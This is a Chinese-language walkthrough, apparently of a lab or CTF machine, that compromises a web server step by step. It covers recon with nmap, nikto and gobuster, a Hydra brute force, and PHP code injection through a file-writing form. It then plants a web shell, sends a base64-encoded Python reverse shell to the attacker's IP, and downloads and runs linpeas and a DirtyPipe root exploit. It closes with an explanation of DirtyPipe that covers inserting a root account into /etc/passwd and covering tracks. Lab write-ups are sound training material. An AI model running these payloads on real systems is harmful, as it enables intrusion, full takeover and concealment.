1. 偵測在同一個網段內有哪些裝置在線 
     ```
     sudo netdiscover -i eth0
     ```
     ![image](https://hackmd.io/_uploads/H1Vsfq48le.png)
2. 掃描 IP
    ```
    nmap 192.168.101.129 -sV
    ```
    ![image](https://hackmd.io/_uploads/HJAJ79NIxl.png)
3. 查看網頁
    ```
    curl -i http://192.168.101.129
    ```
    ![image](https://hackmd.io/_uploads/HkRQQqEIge.png)
4. 使用 nikto 掃描 Apache 服務(port 80)
    ```
    nikto -h http://192.168.101.129
    ```
    ![image](https://hackmd.io/_uploads/ryy5X54Ilx.png)
5. 枚舉目錄與文件
    ```
    gobuster dir -u http://192.168.101.129 -w /usr/share/wordlists/dirb/common.txt
    ```
    * 但 `robots.txt` 跟 `jquery` 目錄底下也沒甚麼東西
6. 使用Hydra對目標的HTTP GET請求進行暴力破解
    ```
    hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://192.168.101.129:80 -V
    ```
    ![image](https://hackmd.io/_uploads/Hyog9qELxx.png)
    * `http-get` 表示目標是基於 `GET` 請求的 HTTP 服務
    * `-l admin` 指定用戶名為 admin
    * `-P` 指定使用 `rockyou.txt` 作為密碼字典
    * `-V` 表示顯示詳細的嘗試過程
    * 最後沒找到能登入的頁面
7. 爆破目錄。`-x php,html,txt` 指定要嘗試的檔案副檔名，這裡是 php、html 和 txt
    ```
    gobuster dir -u http://192.168.101.129:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php , html , txt
    ```
    ![image](https://hackmd.io/_uploads/HyR_h24Lgg.png)
8.  查看 `graffiti.txt`
![image](https://hackmd.io/_uploads/BJ_jTnNLeg.png)
    * 發現輸入框輸入的文字會顯示在上方的 graffiti.txt
9.  Burp 攔截修改送出
![image](https://hackmd.io/_uploads/rJ_mHa4Llg.png)
    * 使用 `<?php phpinfo(); ?>` 先進行測試能否成功植入
    * 由於空格可能導致 PHP 代碼被過濾或解析失敗，故使用 `message=%3C%3Fphp%20phpinfo()%3B%20%3F%3E&file=shell.php`
19. 成功跑出 phpinfo 頁面![image](https://hackmd.io/_uploads/SkDXITNIee.png)
11. 開始植入反向 shell
![image](https://hackmd.io/_uploads/H1Fj6648ex.png)
![image](https://hackmd.io/_uploads/Byg10aNIel.png)
    - 使用 `<?php system($_GET['cmd']); ?>`指令
12. 下指令讓我可以在攻擊端監聽
    ```
    http://192.168.101.129/shell6.php?cmd=echo%20cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTkyLjE2OC4xMDEuMTI4Iiw0NDQ0KSk7W29zLmR1cDIocy5maWxlbm8oKSxmKWZvciBmIGluKDAsMSwyKV07cHR5LnNwYXduKCJiYXNoIikn%20|%20base64%20-d%20|%20bash
    ```
    指令解碼結果為
    ```python
    python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.101.128",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
    ```
    * 192.168.101.128 這邊放自己的 ip

    監聽成功
    ![image](https://hackmd.io/_uploads/rk6UE0VIlx.png)
13. 獲得交互 shell
    ```
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
    export TERM=xterm-256color
    alias ll='ls -lsaht --color=auto'
    Ctrl + Z [Background Process]
    stty raw -echo ; fg ; reset
    stty columns 200 rows 200
    ```
    ![image](https://hackmd.io/_uploads/HJKssxB8gg.png)
14. 載攻擊端的 linpeas.sh 到受害端掃描漏洞
![image](https://hackmd.io/_uploads/rkqDy1SIee.png)
    ```
    # 在攻擊端監聽
    python -m http.server
    # 在受害端下載 
    wget 192.168.101.128:8000/Desktop/linpeas.sh -O /tmp/linpeas.sh
    # 加權 
    chmod +x linpeas.sh.1
    # 執行 
    ./linpeas.sh.1
    ```
15. 利用 linpeas 掃描到的漏洞提權
    * 潜在漏洞
`CVE-2021-3490` (eBPF ALU32 bounds tracking) : 可能可以利用 eBPF 漏洞進行提權。
`CVE-2022-0847` (DirtyPipe) : 一個非常强大的漏洞，可以直接提權。
`CVE-2021-3156` (sudo Baron Samedit) : 如果 sudo 版本符合條件，可以利用此漏洞。
![image](https://hackmd.io/_uploads/BkL2A1SUxe.png)
在攻擊端下載好 Dirty-Pipe.sh 後載入受害端執行
![image](https://hackmd.io/_uploads/S1kOleBIel.png)
        ```
        # 從攻擊端下載
        wget 192.168.101.128:8000/Desktop/CVE/Dirty-Pipe.sh -o /tmp/DirtyPipe
        # 加權
        chmod +x Dirty-Pipe.sh
        # 執行
        bash Dirty-Pipe.sh
        # 確認身分 
        whoami
        ```
16. 讀取 flag
![image](https://hackmd.io/_uploads/HJJrGeBUgl.png)

---

### **DirtyPipe 提權邏輯**
1. **漏洞背景**：
   - DirtyPipe 漏洞存在於 Linux 内核的管道實現中，影響 5.8 及以上版本。
   - 漏洞允許攻擊者通過管道寫入任意文件，即使文件是唯讀的。

2. **漏洞利用步骤**：
   - **創建管道**：
     攻擊者創建一個管道，並向管道寫入數據。
   - **定位目標文件**：
     使用文件描述符打開目標文件（例如 `/etc/passwd`）。
   - **覆蓋文件内容**：
     利用 DirtyPipe 漏洞，將惡意數據注入到目標文件的特定位置。

3. **提權實現**：
   - 修改 `/etc/passwd` 文件，添加一個具有 `root` 權限的用戶。
     示例：
     ```
     rootkit:x:0:0:root:/root:/bin/bash
     ```
   - 使用新添加的用戶登入系统，獲得 `root` 權限。

4. **恢復文件**：
   - 為了避免系统崩潰或被發現，攻擊者通常會備份原始文件，並在提權後恢復。

---

### **DirtyPipe 提權腳本的核心邏輯**
1. **備份 `/etc/passwd` 文件**：
   - 防止修改失敗導致系统不可用。
2. **利用漏洞寫入惡意數據**：
   - 將惡意用戶資訊注入到 `/etc/passwd` 文件中。
3. **切換到新用戶**：
   - 使用新用戶登入，獲得 `root` 權限。
4. **清理痕跡**：
   - 恢復 `/etc/passwd` 文件，刪除腳本和其他臨時文件。

---

### **DirtyPipe 的影響**
- 非特權用戶可以直接獲得 `root` 權限。
- 攻擊者可以修改任何文件，包括系统配置文件。
- 影響所有運行受漏洞影響内核版本的 Linux 系统。